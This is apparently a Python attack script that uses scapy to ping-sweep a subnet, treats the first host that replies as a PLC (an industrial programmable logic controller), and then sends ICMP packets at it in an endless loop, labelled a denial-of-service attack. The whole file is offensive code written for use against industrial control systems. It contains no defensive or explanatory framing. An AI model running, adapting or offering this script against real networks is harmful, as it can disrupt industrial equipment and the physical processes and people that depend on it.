import os
import sys
import time
import socket
from scapy.all import IP, ICMP, send, sr1

def find_plc_ip(subnet):
    """
    Discover the PLC's IP address by performing a ping sweep on the subnet.
    """
    print(f"Scanning subnet {subnet} for the PLC...")
    for ip in range(1, 255):
        target_ip = f"{subnet}.{ip}"
        packet = IP(dst=target_ip)/ICMP()
        response = sr1(packet, timeout=1, verbose=0)
        if response:
            print(f"Found PLC at {target_ip}")
            return target_ip
    print("PLC not found in the subnet.")
    return None

def perform_dos_attack(target_ip):
    """
    Perform a Denial-of-Service (DoS) attack by overwhelming the PLC with ICMP requests.
    """
    print(f"Starting DoS attack on PLC at {target_ip}...")
    try:
        while True:
            packet = IP(dst=target_ip)/ICMP()
            send(packet, verbose=0)
            print(f"Sent ICMP packet to {target_ip}")
            time.sleep(0.1)  # Adjust the delay to control the attack intensity
    except KeyboardInterrupt:
        print("DoS attack stopped.")
    except Exception as e:
        print(f"Error during DoS attack: {e}")

if __name__ == "__main__":
    # Define the subnet (e.g., 192.168.1)
    subnet = "192.168.1"
    
    # Step 1: Find the PLC's IP address
    plc_ip = find_plc_ip(subnet)
    if not plc_ip:
        print("Exiting script.")
        sys.exit(1)
    
    # Step 2: Perform the DoS attack
    perform_dos_attack(plc_ip)